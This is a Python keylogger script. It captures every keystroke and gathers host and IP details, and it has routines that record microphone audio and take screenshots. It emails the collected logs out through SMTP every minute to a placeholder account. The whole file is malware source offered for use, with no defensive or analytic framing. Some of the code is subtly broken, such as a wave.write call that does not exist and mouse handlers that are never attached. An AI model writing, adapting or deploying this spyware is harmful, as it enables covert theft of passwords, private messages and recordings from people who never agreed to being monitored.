import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_email_password"
SEND_REPORT_EVERY = 60  # as in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password
        self.running = True  # Flag to control the main loop

    def append_log(self, string):
        self.log += string

    def on_move(self, x, y):
        logging.info("Mouse moved to {} {}".format(x, y))
        self.append_log(f"Mouse moved to {x}, {y}\n")

    def on_click(self, x, y, button, pressed):
        action = 'Pressed' if pressed else 'Released'
        logging.info(f"{action} {button} at ({x}, {y})")
        self.append_log(f"{action} {button} at ({x}, {y})\n")

    def on_scroll(self, x, y, dx, dy):
        logging.info(f"Scrolled {dx} {dy} at ({x}, {y})")
        self.append_log(f"Scrolled {dx} {dy} at ({x}, {y})\n")

    def on_press(self, key):
        try:
            logging.info(f"Key {key.char} pressed")
            self.append_log(f"Key {key.char} pressed\n")
        except AttributeError:
            logging.info(f"Special key {key} pressed")
            self.append_log(f"Special key {key} pressed\n")

    def send_mail(self, message):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "Keylogger Report"

        body = f"Keylogger Report:\n\n{message}"
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.example.com', 587) as server:
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, msg.as_string())

    def report(self):
        self.send_mail(self.log)
        self.log = ""
        if self.running:
            threading.Timer(self.interval, self.report).start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.append_log(f"\nHostname: {hostname}\n")
        self.append_log(f"IP Address: {ip}\n")
        self.append_log(f"Processor: {plat}\n")
        self.append_log(f"System: {system}\n")
        self.append_log(f"Machine: {machine}\n")

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()
        wave.write('sound.wav', fs, myrecording)

        with open('sound.wav', 'rb') as f:
            audio_data = f.read()

        self.send_mail(audio_data)

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save("screenshot.png")

        with open("screenshot.png", "rb") as f:
            screenshot_data = f.read()

        self.send_mail(screenshot_data)

    def start(self):
        # Start reporting
        self.report()

        # Start keyboard listener
        with Listener(on_press=self.on_press) as keyboard_listener:
            keyboard_listener.join()

    def stop(self):
        self.running = False

if __name__ == "__main__":
    # Set up logging
    logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')

    # Create KeyLogger instance
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)

    try:
        # Start the keylogger
        keylogger.start()
    except KeyboardInterrupt:
        # Stop the keylogger if interrupted
        keylogger.stop()
